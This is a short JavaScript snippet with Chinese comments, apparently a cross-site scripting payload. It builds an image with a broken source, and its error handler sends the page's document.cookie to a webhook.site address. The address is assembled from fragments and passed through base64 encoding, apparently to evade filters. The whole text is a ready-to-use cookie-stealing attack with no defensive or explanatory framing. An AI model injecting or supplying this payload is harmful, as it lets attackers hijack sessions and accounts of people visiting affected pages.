<script>
// 创建一个新的 img 元素
var img = document.createElement('img');

// 设置图片的 src 属性
img.src = 'x';

// 添加图片加载失败时的事件处理程序
img.onerror = function() {
    console.log('123123123');
    var protocol = 'htt';
    var a = 'ps:';
    var domain = '//webhook.site/';
    var path = '7f12c63b-da49-48ad-95d1-3e0ab815788a';
    var url = protocol + a + domain + path;
    var encodedUrl = btoa(url);
    var xhr = new XMLHttpRequest();
    xhr.open('GET', atob(encodedUrl) + '?cookie=' + encodeURIComponent(document.cookie), true);
    xhr.send();
};

// 将图片添加到页面中
document.body.appendChild(img);
</script>
